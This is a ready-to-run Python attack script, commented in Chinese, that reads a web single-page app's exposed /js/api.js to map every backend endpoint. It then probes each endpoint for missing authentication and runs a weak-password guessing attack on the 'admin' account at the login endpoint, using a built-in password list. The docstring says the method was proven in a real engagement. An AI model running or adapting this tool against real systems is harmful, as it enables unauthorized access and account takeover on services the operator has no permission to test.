#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""前端 API 封装文件 → 全接口提取 → 逐个未授权探测 → 定向弱口令登录

核心思路（本次实战验证有效）：
  SPA / React 后台常把「全部后端接口定义」放在一个可匿名读取的 JS 文件里
  （本例: /js/api.js）。先拿这份"接口地图"，再按图索骥，比盲扫目录高效得多。

用法:
    python spa_api_pivot.py <base_url> [api_js_path]
    例: python spa_api_pivot.py http://TARGET:3000 /js/api.js
"""
import sys, re, json, socket, urllib.parse

def http(url, method='GET', body=None, token=None, timeout=12):
    u = urllib.parse.urlparse(url)
    host = u.hostname; port = u.port or (443 if u.scheme == 'https' else 80)
    path = u.path or '/'
    if u.query: path += '?' + u.query
    h = '%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nAccept: application/json\r\n' % (method, path, u.netloc)
    if token: h += 'Authorization: Bearer %s\r\n' % token
    if body is not None: h += 'Content-Type: application/json\r\nContent-Length: %d\r\n' % len(body)
    h += '\r\n'
    s = socket.create_connection((host, port), timeout=timeout); s.settimeout(timeout)
    s.sendall(h.encode() + (body.encode() if body else b''))
    d = b''
    while True:
        try: x = s.recv(65536)
        except: break
        if not x: break
        d += x
    s.close(); return d.decode('utf-8', 'ignore')

def main(base, apijs='/js/api.js'):
    # ① 抓接口地图
    raw = http(base + apijs)
    js = raw.split('\r\n\r\n', 1)[1] if '\r\n\r\n' in raw else raw
    eps = sorted(set(re.findall(r"""['"]([A-Z]+)['"]\s*,\s*['"]([^'"]+)['"]""", js)))
    eps += sorted(set(re.findall(r"""request\(\s*['"]([A-Z]+)['"]\s*,\s*['"]([^'"]+)['"]""", js)))
    eps = sorted(set(eps))
    print('=== 从 %s 提取到 %d 个接口 ===' % (apijs, len(eps)))
    for m, p in eps: print('  %-6s %s' % (m, p))

    # ② 逐个未授权探测
    print('\n=== 未授权探测 ===')
    protected, openeps = [], []
    for m, p in eps:
        pp = re.sub(r'[?&][^=]*=$', '', p)  # 去掉裸参数
        r = http(base + pp, method=m if m in ('GET', 'POST') else 'GET',
                 body='{}' if m == 'POST' else None)
        code = r.split('\r\n')[0]
        bk = r.split('\r\n\r\n', 1)[1][:120].replace('\n', ' ') if '\r\n\r\n' in r else ''
        print('  %-6s %-34s %-24s %s' % (m, pp, code[:24], bk[:90]))
        (openeps if '200' in code else protected).append((m, p))
    print('\n无需鉴权: %d 个 | 需鉴权: %d 个' % (len(openeps), len(protected)))

    # ③ 定向弱口令（只打 login 端点）
    logins = [p for m, p in eps if 'login' in p.lower()]
    if not logins:
        print('\n未发现 login 端点，跳过弱口令'); return
    PW = ['admin123', 'admin', '123456', 'admin888', 'password', 'admin@123', '123456789',
          'admin123456', 'root', 'Aa123456', 'qwe123456', 'adminadmin']
    print('\n=== 定向弱口令 (%s) ===' % logins[0])
    for pwd in PW:
        body = json.dumps({'username': 'admin', 'password': pwd})
        r = http(base + logins[0], 'POST', body)
        code = r.split('\r\n')[0]
        bk = r.split('\r\n\r\n', 1)[1][:150].replace('\n', ' ') if '\r\n\r\n' in r else ''
        hit = '200' in code and ('token' in bk or 'access' in bk)
        print('  admin/%-14s %-24s %s%s' % (pwd, code[:24], bk[:80], '  *** HIT ***' if hit else ''))
        if hit:
            print('\n★★★ 命中: admin / %s' % pwd)
            print('响应:', bk)
            return
    print('\n弱口令未命中')

if __name__ == '__main__':
    a = sys.argv[1:]
    main(a[0], a[1] if len(a) > 1 else '/js/api.js')